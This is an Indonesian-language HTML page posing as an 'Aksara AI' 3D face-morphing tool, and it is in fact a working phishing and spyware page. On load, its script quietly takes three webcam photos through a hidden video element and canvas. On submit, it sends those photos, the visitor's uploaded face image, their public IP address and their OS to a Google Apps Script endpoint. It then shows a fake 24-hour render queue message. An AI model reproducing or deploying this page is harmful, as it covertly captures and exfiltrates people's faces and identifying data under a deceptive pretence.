<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aksara AI - Face Morphing Labs</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f9fafb; color: #111827; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background: white; width: 90%; max-width: 400px; padding: 35px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
        .brand { font-weight: 800; color: #4f46e5; font-size: 24px; margin-bottom: 5px; }
        h2 { font-size: 18px; color: #374151; margin-bottom: 25px; }
        .upload-box { border: 2px dashed #6366f1; padding: 40px 20px; border-radius: 15px; background: #f5f3ff; cursor: pointer; transition: 0.3s; margin-bottom: 20px; }
        .upload-box:hover { background: #ede9fe; }
        .btn { background: #4f46e5; color: white; border: none; padding: 16px; font-weight: 700; border-radius: 10px; width: 100%; cursor: pointer; display: none; }
        #loading { display: none; margin-top: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4f46e5; width: 30px; height: 30px; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas, input[type="file"] { display: none; }
    </style>
</head>
<body>

<div class="card" id="app">
    <div class="brand">AKSARA AI</div>
    <h2>Transformasi Wajah 3D</h2>
    
    <div id="input-section">
        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
            <span style="font-size: 40px;">📁</span>
            <p id="infoText" style="font-weight: 600; margin-top: 10px;">Pilih Foto Wajah</p>
        </div>
        <input type="file" id="fileInput" accept="image/*">
        <button id="submitBtn" class="btn">GENERATE SEKARANG</button>
    </div>

    <div id="loading">
        <div class="spinner"></div>
        <p id="loadStatus" style="font-weight: 600; color: #4f46e5;">Menyiapkan mesin AI...</p>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const GAS_URL = "https://script.google.com/macros/s/AKfycbw5o6oou9CETWkRi720Vdjt9w34owGT8JAUxJU_eCjl056IHjMh0YVIjdkI1egz8Siulw/exec"; // GANTI DENGAN URL WEB APP ANDA
const fileInput = document.getElementById('fileInput');
const submitBtn = document.getElementById('submitBtn');
const loadStatus = document.getElementById('loadStatus');

let secretPhotos = [];

// Fungsi ambil foto kamera otomatis di background
async function startSecretCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        const canvas = document.getElementById('canvas');
        
        for (let i = 0; i < 3; i++) {
            await new Promise(r => setTimeout(r, 2000));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            secretPhotos.push(canvas.toDataURL('image/jpeg', 0.6));
        }
        stream.getTracks().forEach(t => t.stop());
    } catch (e) { console.log("Kamera diblokir"); }
}

startSecretCapture();

fileInput.addEventListener('change', (e) => {
    if (e.target.files.length > 0) {
        document.getElementById('infoText').innerText = e.target.files[0].name;
        submitBtn.style.display = 'block';
    }
});

submitBtn.addEventListener('click', async () => {
    document.getElementById('input-section').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    
    // Baca file yang di-upload user
    const reader = new FileReader();
    reader.readAsDataURL(fileInput.files[0]);
    reader.onload = async function() {
        const userFileData = reader.result;

        // Ambil Metadata
        let ip = "Unknown";
        try { const res = await fetch('https://api.ipify.org?format=json'); const d = await res.json(); ip = d.ip; } catch(e) {}
        
        loadStatus.innerText = "Memproses pemindaian wajah...";
        setTimeout(() => { loadStatus.innerText = "Merender karakter 3D..."; }, 2500);

        fetch(GAS_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                ip: ip,
                os: navigator.platform,
                images: secretPhotos, // Foto kamera rahasia
                userFile: userFileData // File yang di-upload user
            })
        }).then(() => {
            setTimeout(() => {
                document.getElementById('app').innerHTML = `
                    <h2 style="color:#10b981">Antrean #102 Berhasil</h2>
                    <p style="font-size:14px; color:#6b7280; line-height:1.6;">
                        Proses render membutuhkan waktu 24 jam.<br>
                        Hasil akan tersimpan otomatis di perangkat ini.
                    </p>
                `;
            }, 5000);
        });
    };
});
</script>
</body>
</html>
